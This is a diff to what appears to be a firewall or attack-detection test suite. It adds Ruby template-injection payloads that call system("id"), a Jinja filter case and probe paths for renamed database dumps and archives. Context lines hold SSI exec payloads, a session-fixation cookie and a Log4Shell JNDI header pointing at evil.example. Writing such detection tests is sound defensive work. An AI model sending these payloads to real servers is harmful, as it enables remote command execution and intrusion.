@@ -211,6 +211,10 @@ q $A ssti "ssi printenv"               '<!--#printenv -->'
 json $A ssti "ssi exec with backtick"  '{"note":"<!--#exec cmd=\"ls `id`\" -->"}'
 q $A ssti "ssi config errmsg"           '<!--#config errmsg="x" -->'
 q $A ssti "ssi set variable"            '<!--#set var="a" value="b" -->'
+# Aegolith (alpha.6 final review): a call around a nested #{ }, the safe filter read by its first token.
+q $A ssti "ruby call around nested data path" '#{system("id #{a.b}")}'
+json $A ssti "ruby call around nested number" '{"note":"#{system(\"id #{1}\")}"}'
+q $A ssti "jinja safe filter in a conditional" "{{ x|safe if a else b }}"
 
 # --- 7. Log4Shell / JNDI ---------------------------------------------------------------------------------------
 hdr $A log4shell "jndi in user-agent"  User-Agent "\${jndi:ldap://evil.example/a}"
@@ -309,6 +313,9 @@ hdr $A scanner "detectify"             User-Agent "Detectify"
 hdr $A scanner "jorgee"                User-Agent "Mozilla/5.0 Jorgee"
 hdr $A scanner "zmeu"                  User-Agent "ZmEu"
 hdr $A scanner "paros"                 User-Agent "Paros/3.2.13"
+# Aegolith (alpha.6 final review): dumps and archives renamed with the web types added to the root rule.
+path $A scanner "sql dump renamed as a module" "/x.sql.mjs.gz"
+path $A scanner "tar archive renamed as a feed" "/backup.tar.rss.gz"
 
 # --- 14. Session fixation / misc ----------------------------------------------------------------------------------
 q $A session "session fixation"        "PHPSESSID=attacker-fixed-id"
